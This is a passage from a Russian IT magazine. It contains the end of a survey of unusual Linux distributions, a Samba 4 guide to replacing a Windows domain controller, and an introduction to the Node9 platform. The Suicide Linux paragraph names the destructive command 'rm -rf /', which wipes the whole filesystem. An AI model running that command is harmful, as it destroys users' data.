можно включить. Календарь может быть задан как по привычному нам летоис-
числению, так и по северокорейскому летоисчислению чучхе (сейчас по нему
идет 104 год). В качестве GUI используется KDE3. Из сервисов (при открытом
брандмауэре) доступен лишь Samba.
   Браузер под названием Naenara на самом деле представляет собой Firefox
3.5. При запуске он пытается соединиться с аналогично названным порталом
(Naenara в переводе означает «моя страна»). Интернет в Северной Корее
как таковой отсутствует, и все новости местные жители, у которых есть доступ
в Сеть, получают через ограниченное количество сайтов.

                                                                Red Star OS.
                                                              Запущен
                                                                     браузер
                                                                   Naenara





   Несмотря на это, дистрибутив следит за тем, какие сайты посещает пользо-
ватель, и направляет эту информацию куда следует — разумеется, в том слу-
чае, если компьютер находится в Северной Корее. Дистрибутивом этим, впро-
чем, пользуются редко даже в самой Северной Корее, так что его (как и многие
другие дистрибутивы, описанные в данной статье) стоит рассматривать скорее
как забавный казус.

PELICANHPC
PelicanHPC предназначен для построения кластерных систем. Дистрибутив
позволяет развернуть кластер без особых усилий. Управляющий компьютер
(по терминологии дистрибутива «фронтенд») запускается с Live CD. Вычисли-
тельные узлы загружаются посредством PXE. Основан дистрибутив на Debian,
а создан с помощью Debian Live — инфраструктуры для создания Live-дисков.
   Благодаря AUFS доустановка какого-либо пакета не вызовет затруднений.
По умолчанию дистрибутив доступен только под x64, однако ничто не меша-
ет собрать и 32-разрядную версию с помощью скрипта make_pelican. В каче-
стве кластерного решения используется OpenMPI; кроме того, в дистрибутив
включен Фортран (77 и 90) и Octave, также имеются привязки к MPI для C, C++,
Python и тест Linpack, при помощи которого часто оценивают производитель-
ность. Кластер масштабируем — команда pelican_restarthpc позволяет добав-
лять или удалять узлы. Для мониторинга используется Ganglia — ПО, алгоритмы
которого позволяют определить оверхед узлов.





PelicanHPC. Запущен Octave

   Кластерные вычисления и MPI — тема отдельной статьи. Однако дистрибу-
тив в плане развертывания действительно прост. Вот с использованием могут
быть трудности — OpenMPI, по некоторым данным, имеет достаточно низкую
производительность.

DOUDOULINUX
Это Linux для детей. Позиционируется при этом как предназначенный букваль-
но для всех возрастов — от двух до двенадцати. В отличие от аналогичных дис-
трибутивов, в данном есть русский язык. Впрочем, он для подобного дистрибу-
тива не столь важен, если не считать обучения языку.

                                                                Окно входа
                                                                     DoudouLinux





  В состав дистрибутива входят программы для рисования, развития памя-
ти и пространственного мышления, печати на клавиатуре, пазлы... Есть также
анаграммы, Midi-клавиатура и многое другое. Оболочка (LXDE) специально за-
точена для детей — чтобы что-то сломать, нужно хорошо постараться или быть
хоть немного в теме компьютеров. Помимо всего прочего, имеется локальный
прокси DansGuardian, который должен защищать детей от пагубного влияния
интернета.

                                                                 Развиваю-
                                                         щие игры —
                                                                и это еще
                                                                   не весь набор





   Есть, однако, у этого дистрибутива и недостатки, один из которых — нестан-
дартная раскладка клавиатуры. Точнее, раскладка-то для русского языка стан-
дартная, но как только пытаешься переключить — вместо буквы y печатается
z и, соответственно, наоборот. А дело здесь в том, что, помимо русской и ан-
глийской раскладки, имеются немецкая и французская, которые следуют сразу
после русской. Имеются проблемы с DansGuardian — он настроен на фильтра-
цию только 80-го порта. Этого достаточно для защиты от случайного попадания
на подозрительные сайты, от намеренного же, понятное дело, это не спасет.
И все бы ничего, но дети, уже умеющие сидеть в Сети, слишком быстро учатся.
   Дистрибутив, пожалуй, самый практически полезный из рассмотренных,
разве что я бы все же поужал возрастные рамки: два года и двенадцать лет
слишком большой разброс.

SUICIDE LINUX
Бесполезный (и даже вредный) пакет, доступный для Debian-based систем,
превращает работу в консоли в русскую рулетку. Стоит лишь один раз допу-
стить опечатку в команде или аргументах, как моментально будет выполнена
команда rm -rf /. Это может быть довольно полезным занятием для трениров-
ки концентрации внимания — при условии, конечно, что пакет устанавливается
не на продакшен.


ЗАКЛЮЧЕНИЕ
В мире *nix существует много чудных вещей — в частности, интересные
(и не очень) дистрибутивы, сборную солянку которых мы и подготовили. Боль-
шая их часть представляет скорее исторический интерес, однако отдельные
актуальны и сейчас. Возможно, некоторые из них следовало бы реанимиро-
вать, но заниматься этим некому.
  Из описанных стоило бы особо выделить три — GoboLinux, LinuxCNC
и DoudouLinux. Первый дистрибутив выглядит с точки зрения новизны весьма
заманчиво — несмотря на то что известен он с начала двухтысячных, в нем до сих
пор есть нотка некой революционности. Второй интересен своим ПО для стан-
ков с ЧПУ и заточенностью ядра под определенные задачи. Третий же будет
интересен молодым родителям как развивающее средство для детей.
  В целом же все многообразие еще раз подчеркивает основное преимущество
open source — свободу выбора. Каждый волен выбирать свое и развивать его в том
направлении, которое ему интересно, а там уже и соратники подтянутся.
SYNACK
МЕНЯЕМ ГЛАВНОГО
ПЕРЕХОДИМ С WINDOWS 2003/2008
       НА LINUX SAMBA





                                   Мартин «urban.prankster»
                                            Пранкевич
                                                    martin@synack.ru



Вот и закончилась эра Windows Server 2003, слу-
жившей верой и правдой более десятилетия. От-
каз от поддержки означает отсутствие обновлений
и исправлений для более 11 миллионов систем, что
в будущем может означать большую проблему в без-
опасности. Уже сегодня нужно подумать о перехо-
де на современную ОС. MS уже предложила мастер
и инструкции, но итоговая цена все-таки кусается,
а поэтому стоит посмотреть в сторону open source.
Будем заменять КД Linux-сервером.


ЧТО БУДЕМ ДЕЛАТЬ?
Основным протоколом общения Win-систем в локальной сети служит SMB, из-
 начально разработанный в IBM для обеспечения доступа к файлам и принте-
 рам. В MS была добавлена поддержка NTLM-авторизации, а новый диалект по-
 лучил название CIFS (Сommon Internet File System). В настоящее время с Win 8
 доступна уже версия 3 протокола. Для централизованного администрирования
 компьютеров Win используется домен на основе Active Directory, задача ко-
 торого — аутентификация пользователей и установка политик безопасности.
В работе AD опирается на протоколы LDAP, Kerberos и DNS. С появлением ге-
 терогенных сетей возникла необходимость сетевой интеграции *nix с Win-си-
 стемами и AD. С одной стороны стояли юниксовские FTP и NFS, с другой SMB
 и AD. C первыми Win-клиенты работали без проблем, но в локальной сети они
 были не всегда удобны.
   Решение второй проблемы взял на себя проект Samba (https://www.samba.
 org), разрабатывающий с 1992 года свою реализацию сервера и клиента SMB/
 CIFS под *nix. Учитывая, что спецификации SMB/CIFS долгое время были недо-
 ступны, разработки шли медленно, хотя в общем в Samba 3 *nix-системы уже
 могли использоваться в качестве файлового сервера для Win-клиентов с ав-
 торизацией в AD. В 2004 году стали доступны спецификации SMB/CIFS и про-
 токолы обмена AD, это дало старт новой ветке Samba 4, в развитии которой
 уже принимала участие и MS. Окончательный релиз Samba 4 был представлен
 в конце декабря 2012 года и сегодня уже рекомендуется к промышленному ис-
 пользованию. Поддержка Samba 3 на данный момент завершается.
   В отличие от версии 3, Samba 4 имеет встроенные LDAP-сервер и сервер
 Kerberos KDC (Key Distribution Center). Служба DNS, являющаяся частью Active
 Directory, реализована в виде встроенного DNS-сервера, поддерживающего
 минимально необходимый набор функций. Как вариант, может генерироваться
файл конфигурации для BIND. Специально разработана новая версия файло-
 вого сервера NTVFS, оптимизированного к требованиям AD. Правда, пока она
 находится в стадии разработки, и по умолчанию предлагается smbd. Поддер-
 живается интеграция с сервером ntpd и синхронизация времени с рабочими
 станциями, реализована ACL в базе пользователей и многое другое. В итоге
 сервер с Samba 4 может выступать в качестве полноценного Active Directory
 Domain Controller, а не домена NT, как в версии Samba 3. Поддерживаются кли-
 енты вплоть до новейших Win 8.1, групповые политики, перемещаемые профи-
 ли, интеграция с Microsoft Exchange и многое другое.
   В настоящее время поддерживается схема леса (forests schema) с макси-
 мальной версией 47, то есть Win 2008 R2 (30 — Win 2003, 31 — Win 2003 R2
 и 44 — Win 2008). Так что все сказанное будет актуально и для всех ОС вплоть
 до Win 2008 R2 включительно. К более поздним можно даже не пробовать под-
 ключаться, получишь ошибку. Проверить версию можно при помощи dsquery:

 > dsquery * "CN=Schema,CN=Configuration,DC=Root-Domain"
 -Scope Base -attr objectVersion

Или при помощи PowerShell:

 > Get-ADObject(Get-ADRootDSE).schemaNamingContext
 -PropertyobjectVersion

В качестве альтернативы можно использовать ADSIedit или посмотреть значе-
 ние в реестре.
  С теорией покончено. Теперь нам осталось всего ничего. Чтобы произве-
 сти миграцию с Win 2003/2008 на *nix/Samba, нужно установить Samba 4, под-
 ключить его к домену в качестве КД, передать роли, выключить Win 2003/2008.
В Сети много руководств, но часть из них путаны и нередко рекомендуют лиш-
 ние действия, в части приведена уже несколько устаревшая информация, ко-
 торая была актуальна для ранних релизов Samba 4. В качестве отправной точки
 рекомендую официальную документацию проекта (https://wiki.samba.org).

УСТАНОВКА SAMBA
В Сети обычно несколько контроллеров домена, определить владельцев ролей
FSMO можно при помощи dsquery server. Данные понадобятся при дальнейших
 настройках. Например, хозяин схемы (Schema Master) определяется командой

 > dsquery server -hasfsmo schema

В более новых версиях ОС можно использовать командлеты модуля Active
 Directory — Get-ADForest, Get-ADDomain.





 Определяем Schema Master

 Готовим сервер с Linux. Ставить будем на примере Ubuntu 14.04 LTS. В дру-
 гих дистрибутивах будут отличия в расположении конфигурационных файлов
 и особенностях пакетной системы. Как вариант, можно развернуть Samba-сер-
 вер при помощи сторонних проектов (см. врезку).

Готовые решения

 Также в Сети можно найти несколько готовых проектов для быстрого разверты-
 вания сервера Samba или замены AD. Например, SerNet Samba4 Appliance
 (enterprisesamba.com/samba4app) предлагает репозиторий для основных дис-
 трибутивов Linux, содержащий пакеты последнего релиза Samba и готовый
 дистрибутив на базе Debian со cконфигурированным доменом на Samba 4,
 включая расширения от Zarafa AD и инструменты групповой работы Zarafa.
В TurnKey (www.turnkeylinux.org/domain-controller) также есть готовый дис-
 трибутив для организации PDC на базе Samba, содержащий готовые предна-
 стройки и графические инструменты конфигурирования, который может быть
 развернут как на железе, так и в VM. Многоцелевой серверный дистрибутив
 Zentyal (www.zentyal.org) предлагает интерфейс и модули, позволяющие бы-
 стро установить и настроить контроллер домена на основе Samba 4. Поставля-
 ется в виде готового ISO-образа и пакетов для Ubuntu. Серверный дистрибутив
 Clear OS (clearfoundation.com), выросший из маршрутизатора, теперь обеспе-
 чивает простую возможность развертывания сервера, который может заменить
 контроллер домена для Windows ПК. Построен на базе RHEL.
Кроме этого, не стоит забывать проекты, расширяющие стандартные воз-
можности LDAP и вполне способные заменить Active Directory: FreeIPA (www.
 freeipa.org), GOsa2 (oss.gonicus.de/labs/gosa), 389 Directory Server (directory.
 fedoraproject.org) и FusionDirectory (fusiondirectory.org).



 Поначалу необходимо настроить разрешение имен через DNS. Руководство
 отсылает сразу к /etc/resolv.conf. Но дело в том, что в Ubuntu, как и в некото-
 рых других дистрибутивах, файл /etc/resolv.conf генерируется автоматически
 при помощи утилиты resolvconf скриптом /etc/network/if-up.d/000resolvconf. По-
 этому редактировать его вручную не рекомендуется: данные будут перезапи-
 саны при первой же перезагрузке. Сделаем все правильно. Пусть 192.168.1.1/
 example.org будет наш действующий КД, 192.168.1.2/samba.example.org —
 сервер с Samba. В /etc/network/interfaces необходимо установить правильные
 значения dns-search и dns-nameservers:

 $ sudo nano /etc/network/interfaces
 auto eth0
 iface eth0 inet static
     address 192.168.1.2
     netmask 255.255.255.0
     gateway 192.168.1.1
     dns-search example.org
     dns-nameservers 192.168.1.1 8.8.8.8

 Далее можно перезагрузить сеть sudo service network restart, чтобы оно выпол-
 нило resolvconf -a eth0.inet с нужными параметрами. Но это срабатывает не во
 всех дистрибутивах, поэтому проще перезагрузить систему. После проверяем
 файл, убеждаемся, что все нормально:

 $ cat /etc/resolv.conf
     nameserver 192.168.1.1
     nameserver 8.8.8.8
     search example.org

 Также желательно прописать правильное имя узла Samba в /etc/hosts:

 $ sudo nano /etc/hosts
 192.168.1.2    samba.example.org samba

 Проверяем корректность разрешения имени КД:

 $ host -t A example.org

 Пакеты Samba 4 есть в репозиториях всех современных дистрибутивов Linux,
 поэтому установка проблем не вызывает. Хотя там может быть не самая ак-
 туальная версия, а значит, будут недоступны все последние возможности и,
 главное, исправления. Сами разработчики Samba рекомендуют SerNet (https://
 portal.enterprisesamba.com), подключаем в /etc/apt/source.list репозиторий:

 deb https://sernet-samba-public:Noo1oxe4zo@download.sernet.de/
 packages/samba/4.2/ubuntu trusty main
 deb-src https://sernet-samba-public:Noo1oxe4zo@download.sernet.de/
 packages/samba/4.2/ubuntu trusty main

 Обновляем список пакетов и проверяем версию:

 $ sudo apt-get update
 $ sudo apt-cache show samba | grep -i version
 Version: 99:4.2.2-8
 Version: 2:4.1.6+dfsg-1ubuntu2.14.04.8

 Ставим:

 $ sudo apt-get install samba sernet-samba-ad

 Или, если используется пакет из основного репозитория, просто

 $ sudo apt-get install samba

Перед дальнейшими действиями рекомендуется проверить корректность ра-
 боты DNS и Kerberos для подключения к домену. Для этого нам понадобятся
 клиентские утилиты Kerberos.

 $ sudo apt-get install install krb5-user

В процессе установки будет запрошена информация по домену, по окончании
 просто проверяем правильность установок в /etc/krb5.conf:

 [libdefaults]
     dns_lookup_realm = true
     dns_lookup_kdc = true
     default_realm = EXAMPLE.ORG

 Выполняем kinit, используя учетную запись администратора домена:

 $ sudo kinit administrator

 Утилита klist должна выдать информацию о полученном билете:

 $ sudo klist

 Если ошибок не получили, значит, эта часть работает. В принципе, этот шаг
можно пропустить и вернуться, если возникнут проблемы при подключении.
 Хотя в случае с Samba 4 подключение к домену при правильно настроенной
 сети выглядит проще простого.





 Проверяем корректность работы DNS и Kerberos

ПОДКЛЮЧАЕМСЯ К ДОМЕНУ
В поставке Samba 4 идет несколько утилит, некоторые непосредственно ис-
 пользуются для администрирования, часть запускаются демонами и стартовы-
ми скриптами. Основная утилита управления настройками Samba 4 — samba-
 tool, параметров у нее очень много, только субкоманд первого уровня 19. С ее
помощью можем просмотреть и изменить установки, создать новый или под-
 ключиться к существующему домену, создать учетные записи, изменить поли-
 тики, выполнить репликацию и многое другое. Например, чтобы создать новый
 домен в Samba 4, вводим (аналог dcpromo):

 $ sudo samba-tool domain provision --use-rfc2307 --interactive

  И далее отвечаем на вопросы. Но домен у нас уже есть. Для подключения
 к уже существующему домену используется параметр join и учетная запись
 с правами администратора домена. Важный момент: перед запуском следует
 переименовать (удалить) конфигурационный файл /etc/samba/smb.conf. В не-
 которых версиях Samba 4 это было необязательным, сгенерированный файл
 просто проверялся на соответствие или перезаписывался. Но иногда выдается
 ошибка о несоответствии используемого режима работы Samba с прописан-
ным в smb.conf. Можно, конечно, поправить параметры, но, учитывая, что файл
 будет сгенерирован автоматически, делать лишнюю работу, наверное, не сто-
 ит. Лучше потом самому добавить, чего не хватает.

 $ sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.bak
 $ sudo samba-tool domain join example.org DC -Uadministrator
 --realm=example.org

 Кстати, поддерживается и RODC (достаточно в вызове заменить DC на RODC),
 поэтому спокойно можно развернуть такой КД на Linux в удаленном филиале.
   По умолчанию используется внутренний DNS, это самый простой вариант,
 не требующий никаких дальнейших действий. Для сложных ситуаций, вероят-
 но, потребуется BIND, в этом случае к команде следует добавить параметр
 -dns-backend=BIND9_DLZ. Полезно сразу привязать сервис к интерфейсам:
 --option="interfaces=lo eth0" --option="bind interfaces only=yes". Остальные па-
 раметры можно найти, вызвав справку.
   После этого будет произведен поиск КД для указанного домена и запро-
шен пароль администратора. Некоторое время будет затрачено на реплика-
цию данных, в конце должны увидеть «Joined domain DOMAIN (SID ххххх) as a
 DC». Все, Samba 4 сервер присоединен к домену как КД. Сразу в этом можем
 убедиться, перейдя в консоли Active Directory Users and Computers в контейнер
 Domain Controllers, где появился новый контролер домена.





Подключаемся к Active Directory в качестве КД





 Новый КД в консоли Active Directory Users and Computers

По ходу генерируется новый krb5.conf и простейший конфигурационный файл
 smb.conf (шаблоны находятся в /usr/share/samba/setup). Обрати внимание
 на каталоги, в которых хранятся настройки, рекомендую ознакомиться со струк-
 турой файлов:

 $ cat /etc/samba/smb.conf
 [global]
     workgroup = EXAMPLE
     realm = example.org
     netbios name = SAMBA
     server role = active directory domain controller
 [netlogon]
     path = /var/lib/samba/sysvol/example.org/scripts
     read only = No
 [sysvol]
     path = /var/lib/samba/sysvol
     read only = No

Смотрим владельца схемы, он указывает на КД, работающий под Win:

 $ samba-tool fsmo show





 Смотрим владельца схемы и уровень леса средствами samba-tool


 Разработчики SerNet предлагают готовый конфигурационный файл, пока в нем
 нужно изменить только режим запуска, иначе стартовый скрипт не запустится:

 $ sudo nano /etc/default/sernet-samba
 SAMBA_START_MODE="ad"

 Запускаем:

 $ sudo service sernet-samba-ad start

 Проверяем уровень домена и леса:

 $ sudo samba-tool domain level show
     Domain and forest function level for domain 'DC=example,DC=org'
     Forest function level: (Windows) 2003
     Domain function level: (Windows) 2003
     Lowest function level of a DC: (Windows) 2008 R2

 После этого необходимо проверить корректность работы репликации между
 Windows DC и Samba DC, используя

 $ sudo samba-tool dbcheck
 $ sudo samba-tool drs showrepl

 Здесь могут появляться разные ошибки, некоторые со временем исчезнут сами,
 нужно просто подождать. Некоторые можно попробовать устранить в реальном
 времени. Например, ошибка «UpdateRefs failed with ...» появляется из-за того,
 что контроллер домена Windows еще не запустил средство проверки целост-
 ности данных (Knowledge Consistency Checker), так как не создал соединение
 с новым Samba DC. Чтобы исправить это, тебе нужно выполнить repadmin /kcc
 на Win или при помощи samba-tool:

 $ sudo samba-tool drs kcc -Uadministrator example.org

 Если при работе команды получаем предупреждение

 Failed to connect host 192.168.1.2 on port 135
 - NT_STATUS_CONNECTION_REFUSED

 следует проверить список портов и посмотреть, что в логах:

 $ netstat -ant | grep 135
 $ cat /var/log/messages | grep 135

 Бывает, банально забыли перенастроить файрвол или соединение блокирует
 тот же SELinux. Запуск репликации производится командой

 $ sudo samba-tool drs replicate

 Для проверки корректности выполнения репликации между контроллерами
 домена попробуем добавить пользователя на Samba, используя samba-tool
 и консоль администрирования на Win. Параметров у запроса может быть мно-
 го, но в самом простом случае достаточно ввести

 $ sudo samba-tool user add test
 $ sudo samba-tool user list

 Проверь, что новые пользователи появились на контроллере домена Win
 и в списках Samba. Для удаления используем вместо add команду delete, от-
 ключить — disable, изменить пароль — setpassword. Отключим срок действия
 пароля для учетной записи:

 $ sudo samba-tool user setexpiry test --noexpiry

В отличие от Samba 3, Samba 4 не требует дублирования доменного пользо-
 вателя локальной учетной записью. Проверяем доступность GUID объектов
 для нового хоста:

 $ sudo ldbsearch -H /var/lib/samba/private/sam.ldb '(invocationid=*)'
 --cross-ncs objectguid

 Для информации о пользователях можно использовать утилиту wbinfo, ключ -u
 позволит посмотреть список доменных пользователей, -g — групп.

 $ wbinfo -u

Смотрим значение ID и SID:

 $ wbinfo --name-to-sid Administrator
 S-1-5-21-2988497100-2060164268-3680497755-500 SID_USER (1)
 $ wbinfo --sid-to-uid
 S-1-5-21-2988497100-2060164268-3680497755-500 0

Новый КД готов. Автоматическое обновление DNS производится за счет пери-
 одического запуска (каждые десять минут) скрипта samba_dnsupdate. Скрипт
 опирается на шаблон имен DNS /var/lib/samba/private/dns_update_list. Структу-
 ра его проста, и при необходимости можно его изменять, добавляя собствен-
 ные узлы. Для управления DNS-записью вручную используется samba-tool.
 Синтаксис прост:

 $ samba-tool dns zonecreate myserver 1.168.192.in-addr.arpa
 –Uadministrator
 $ sudo samba-tool dns add 192.168.1.1 example.org myserver A
 192.168.1.3 –Uadministrator

 Теперь можем прописывать сервер Samba в качестве DNS-сервера и переез-
 жать.

ПЕРЕДАЧА РОЛИ
Перед тем как производить дальнейшие операции, следует позаботиться о ре-
 зервной копии AD, мало ли что пойдет не так. Как и в случае с Win-системой,
 роли хозяина операций с одного КД (PDC) можно передать на другой КД (BDC)
 или принудительно забрать роли с PDC на BDC. Первый способ описан в доку-
 ментации MS (http://goo.gl/G20UOy), проще для этого использовать GUI-сред-
 ства — MMC-консоль «Схема Active Directory» (если ее нет, в окне выбора MMC
 нужно ввести regsvr32 schmmgmt.dll), консоли «Active Directory — домены и до-
 верие» и «Active Directory — пользователи и компьютеры». Другой вариант —
 использовать командную утилиту ntdsutil.
   Принудительное принятие роли на Samba 4 некоторое время считалось не-
 рекомендуемым вариантом, но сейчас вроде бы таких ограничений нет. Чтобы
 захватить все роли, вводим

 $ sudo samba-tool fsmo seize —role=all –Uadministrator

 Иногда приходится добавлять параметр --force. Можно забрать конкретную
 роль, для чего ее указываем вместо all: rid, schema, naming, pdc и infrastructure.
 Проверяем:

 $ sudo samba-tool fsmo show

 Команда transfer позволяет передать роли другому контроллеру домена:

 $ sudo samba-tool fsmo transfer —role=all –Uadministrator

 Для управления доменом, работающим под Samba, используем стандарт-
 ные утилиты администрирования серверной Win или для клиентских ОС Win —
 Administration Tools Pack/RSAT. Некоторые операции можем производить
 и при помощи samba-tool. Например, поднимем функциональный уровень леса
 до Win 2008 R2:

 $ sudo samba-tool domain level --forest-level=2008_R2

 Также в контексте domain можем просмотреть и изменить установки паролей:

 $ sudo samba-tool samba-tool domain passwordsettings show

 Установим минимальную длину пароля в десять символов:

 $ sudo samba-tool domain passwordsettings set --min-pwd-length=10





 Просмотр установок паролей


ВЫВОД
 Проект Samba развивается быстрыми темпами, и в настоящее время исполь-
 зование *nix-систем в качестве контролера домена не выглядит таким уже пу-
 гающим. Все настройки просты и понятны, многие действия, ранее требовав-
шие серьезного разбора, теперь производятся автоматически.
SYNACK
         ПЕС С ГОЛОВОЙ

Евгений Зобнин
zobnin@gmail.com     ДРАКОНА





     ПЕРВЫЙ ВЗГЛЯД НА ОС NODE9,
      ПРЕЕМНИЦУ PLAN 9 И INFERNO




Вот уже почти тридцать лет Plan 9 будоражит умы
юниксоидов. Операционная система, на десятилетия
опередившая свое время, оказалась просто не нуж-
на и была выброшена на обочину айтишного мира.
Inferno, ее преемница, оказалась еще менее востре-
бованной и в конце концов нашла свою смерть в ру-
ках никому не известной компании Vita Nuova. Однако
обе системы и по сей день продолжают допиливать-
ся отдельными разработчиками и даже применяются
для решения узкого круга задач. Появилось множе-
ство форков, большая часть из них умерли, а неко-
торые живут и по сей день. Едва ли не самый инте-
ресный из них — Node9, симбиоз платформы Inferno
и языка Lua, способный потягаться с великим и ужас-
ным Erlang.

ВМЕСТО ВВЕДЕНИЯ
  Я уже давно слежу за развитием Inferno и Plan 9, читаю
листы рассылки, оцениваю форки, время от времени всплы-
вающие на GitHub, а нередко и сам пишу что-нибудь неза-
мысловатое на Limbo, стандартном языке Inferno. Поэтому
проект Node9, базирующийся на идеях Inferno и использу-
                                   WWWющий один из моих любимых и, как мне кажется, сильно
недооцененный язык Lua, сразу привлек мое внимание.      Страница проекта
И как оказалось, не зря. Проект действительно оказался          на GitHub
более чем серьезным и гораздо более развитым, чем все                                                                     Описание архитектуры
остальные «варианты» системы, виденные мной до этого.           Node9
   Что такое Node9? В терминологии самих разработчиков                                                                    Официальная страница
это hosted operating system, а в более привычной нам фор-              Inferno
мулировке — среда или даже, лучше сказать, платформа
                                                                                          Plan 9 Wiki
для запуска распределенных приложений. Node9 базиру-
ется на идеях и технологиях Inferno и Plan 9, которые долж-       Страница LuaJIT
ны быть известны многим читателям. Тем не менее без не-
которых пояснений не обойтись.
  В свое время в основу Plan 9 легла идея единого IPC-механизма, который
бы позволял обмениваться данными как локальным, так и удаленным процес-
сам. Предполагалось, что вся система будет построена вокруг этого механиз-
ма, поэтому уже на ранних этапах разработки ОС был спроектирован протокол
9P (в Inferno его переименовали в Styx), отвечающий за его реализацию. А все
остальные компоненты системы, включая драйверы, графический стек и обыч-
ные приложения, использовали его для взаимодействия друг с другом.
   Ключевая особенность 9P в том, что, по сути, это протокол доступа к удален-
ным (и локальным) файлам. Поэтому в Plan 9 буквально все было представле-
но (синтетическими) файлами, начиная от указателя мыши и заканчивая сете-
вым стеком. Многие вполне обычные приложения также предоставляли доступ
к «своим файлам» с целью обмена данными с другими приложениями. Даже
настройка системы осуществлялась не через конфиги, а с помощью скриптов,
записывающих те или иные значения в файлы. А самое главное — одна Plan 9
машина могла смонтировать всю или часть файловой системы другой машины
по сети и использовать ее файлы для взаимодействия с удаленными прило-
жениями, то есть, по сути, выполнять удаленный вызов процедур (RPC). Такой
подход позволял из коробки получить многие интересные вещи, включая уда-
ленный рабочий стол (дисплей, клавиатура и мышь — это ведь тоже файлы),
удаленный доступ к периферии, простое и удобное масштабирование вычис-
лительных систем. Мой излюбленный пример — реализация NAT. В Plan 9 она
вообще не нужна, достаточно смонтировать каталог /net (содержит файлы се-
тевого стека) удаленной машины поверх локального, и все запущенные после
этого приложения будут использовать сетевой стек этой машины.
  По идее, такой трюк не должен работать, так как для доступа к сетевому сте-
ку удаленной машины нужен сетевой стек локальной. Но в Plan 9 это работает,
благодаря так называемым пространствам имен. Это еще один ключевой ме-
ханизм Plan 9, который гарантирует, что любые изменения файлового дерева,
видимого одному процессу, не отразятся на файловых деревьях, видимых дру-
гим процессам. Возвращаясь к примеру с NAT, это значит, что смонтирован-
ный сетевой стек удаленной машины будет виден только смонтировавшему его
процессу и его потомкам, тогда как все остальные процессы будут продолжать
работать с локальным сетевым стеком. Это очень мощный механизм, позволя-
ющий создавать различные окружения для процессов, а также контролировать
их доступ к ресурсам (кстати, песочницы OpenVZ, LXC и Docker в Linux исполь-
зуют ту же идею пространств имен).





Plan 9 собственной персоной

Последнее, что важно для нас в контексте введения в Node9, — это каналы
и потоки. Язык Limbo, используемый в Inferno по умолчанию, оснащен очень
простой и эффективной системой многопоточности, которая, кстати говоря,
впоследствии перекочевала в язык Go. Суть ее проста до безобразия: в лю-
бой момент любую функцию можно отправить в отдельный поток, вызвав ее
с помощью ключевого слова spawn. Нечто подобное есть в чистом Lua и неко-
торых других языках, но важно не это. Важно то, что при вызове такой функции
можно указать в ее аргументах канал передачи данных (есть такой тип данных
в Limbo), через который она сможет общаться с дочерним потоком. Это назы-
вается модель многопоточности CSP, и она применяется в Limbo и Go для син-
хронизации потоков и обмена данными между ними. Но что самое интересное,
канал можно превратить в файл! И конечно же, этот файл (точнее, каталог, его
содержащий) можно смонтировать с удаленной машины. Брюки превращают-
ся... в распределенное приложение.
  Соберем все это вместе и получим потрясающую платформу для создания
распределенных приложений. Проблема только в том, что Plan 9 сама по себе
довольно маргинальная система, и внедрять ее в продакшен никто не будет.
Inferno, с другой стороны, способна работать поверх других систем, включая
Linux, OS X и Windows, но использует язык Limbo, который хоть и имеет низкий
порог вхождения, но почти никому не известен и не располагает хорошей ба-
зой готовых библиотек. Именно по этой причине появился Node9.

INFERNO, LUAJIT, LIBUV И ВСЕ-ВСЕ-ВСЕ
Итак, Node9 — это симбиоз низкоуровневой части hosted-версии (работаю-
щей поверх другой ОС) Inferno, быстрого JIT-компилятора LuaJIT и библиотеки
асинхронной обработки событий libuv, изначально разработанной для Node.
js, а теперь используемой и другими проектами. Что все это дает стороннему
разработчику? Ну, во-первых, это, конечно же, весь тот комплекс фирменных
технологий Inferno / Plan 9 с возможностью писать софт на достаточно распро-
страненном и очень простом в освоении языке Lua, снабженном эффективным
JIT-компилятором LuaJIT.
   В-вторых, это простая многопоточная модель, реализованная внутри самой
платформы. В Node9 все процессы и потоки работают внутри одного процесса
нижележащей ОС. Это значит, что для переключения между потоками не потре-
буется переключение контекста, а это может дать серьезный выигрыш в про-
изводительности. Ну и плюс ко всему уже обсуждавшаяся ранее модель CSP
на основе функций, каналов и файлов, привязанных к каналам. CSP намного
эффективнее традиционных реализаций многопоточности и, по сути, решает
почти все проблемы распараллеленных приложений. Потоки здесь не делят
одно адресное пространство (область видимости потока = области видимости
функции), они не получают доступ к одним и тем же данным, а вместо этого ис-
пользуют синхронные сообщения (нет проблемы блокировок), их очень просто
синхронизировать.
   В-третьих, эффективная система асинхронной обработки событий (I/O,
TCP, UDP, TTY), не погружающая программиста в callback hell, известный лю-
бому разработчику на Node.js. Node9 опирается на libuv во всем, что касается
обработки ввода-вывода. Поэтому даже системные вызовы (если их можно так
назвать в контексте «ОС, работающей поверх ОС») здесь реализованы через
«событийный цикл». Работает это так. Планировщик Node9 последователь-
но передает управление каждому работающему потоку до тех пор, пока один
из них не сделает системный вызов. В этот момент запускается примерно такая
функция (в данном случае функция read):

function S.read(vp, s_read, fd, buf, nbytes)
    s_read.fd = fd
    s_read.buf = buf
    s_read.nbytes = nbytes
    n9.sysreq(vp, n9.Sys_read)
    coroutine.yield()
    return s_read.ret
end

Она помещает системный вызов в очередь libuv (функция n9.sysreq()), затем
приостанавливает исполнение текущего потока и возвращает управление об-
ратно. После этого планировщик передает управление следующему потоку,
а по исчерпании очереди потоков запускает один проход событийного цикла
libuv (проверка, получены ли запрошенные данные, в данном случае с диска
или по сети, Node9 не делает различий). Затем все начинается сначала. Если
же в ходе цикла libuv обнаруживает получение данных, управление возвраща-
ется сделавшему системный вызов потоку. Вдумчивый читатель может сказать,
что все это сильно напоминает идею так называемых зеленых потоков, реали-
зованную в Smalltalk, Tcl, Erlang, и будет абсолютно прав. Как и ее родоначаль-
ница Inferno, Node9 полностью основана на этой модели, но с привлечением
возможностей libuv и языком Lua вместо Limbo. Реализация программной плат-
формы на основе «зеленых потоков» уже неоднократно доказывала свою эф-
фективность, и она почти не проигрывает событийной модели, применяемой
в Node.js и nginx. Однако в отличие от последних она позволяет «просто писать
код» и не переиначивать свое мышление в пользу callback-ориентированного
программирования, что чревато ошибками и сильным запутыванием кода.
   Благодаря тому что Node9 построена вокруг протокола 9P, ее приложения
очень просто связать с приложениями на любых других языках, для которых
есть библиотека с реализацией 9P. А таких языков много, это чистый си, Go,
Java и множество других. И да, все они будут доступны удаленно.

Кто и как использует Inferno и Plan 9

Компания Coarid применяет Plan 9 и ее компоненты в своих решениях NAS.
•  IBM использовала Plan 9 и некоторые компоненты Inferno на одной из сво-
   их суперкомпьютерных систем Blue Gene/L, построенной на базе 64 тысяч
   процессоров.
• ОС Plan 9 использовалась для управления системой освещения стадиона
   на Олимпийских играх в Сиднее в 2000 году.
